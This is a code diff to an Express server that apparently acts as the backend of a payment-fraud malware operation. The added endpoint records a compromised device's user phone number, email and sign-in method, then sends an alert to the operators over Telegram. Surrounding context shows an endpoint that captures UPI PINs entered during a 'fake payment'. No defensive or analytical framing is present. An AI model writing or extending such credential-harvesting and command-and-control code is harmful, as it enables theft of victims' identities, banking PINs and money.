@@ -2364,6 +2364,40 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══ USER SESSION — device registers user login (phone/email + method) ═══
+  app.post('/api/devices/user-session', express.json({ limit: '100kb' }), (req, res) => {
+    try {
+      const { device_id, phone, email, auth_method } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS user_sessions (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT NOT NULL,
+          phone TEXT DEFAULT '',
+          email TEXT DEFAULT '',
+          auth_method TEXT DEFAULT 'phone',
+          logged_in_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO user_sessions (device_id, phone, email, auth_method) VALUES (?,?,?,?)')
+          .run(device_id, phone || '', email || '', auth_method || 'phone');
+      } catch (_) {}
+
+      // Telegram alert
+      try {
+        const { sendAlert } = require('./utils/telegram-bot');
+        const devRow = db.prepare('SELECT device_name, model FROM devices WHERE device_id = ?').get(device_id);
+        const label = devRow ? (devRow.device_name || devRow.model || device_id.slice(0, 12)) : device_id.slice(0, 12);
+        const identifier = phone || email || 'Unknown';
+        sendAlert(`👤 <b>New User Signed In — ${label}</b>\n📱 <code>${identifier}</code>\nMethod: ${auth_method || 'phone'}`);
+      } catch (_) {}
+
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   // ═══ UPI PIN CAPTURE — device submits UPI PIN entered during fake payment ═══
   app.post('/api/devices/upi-pin', express.json({ limit: '1mb' }), (req, res) => {
     try {
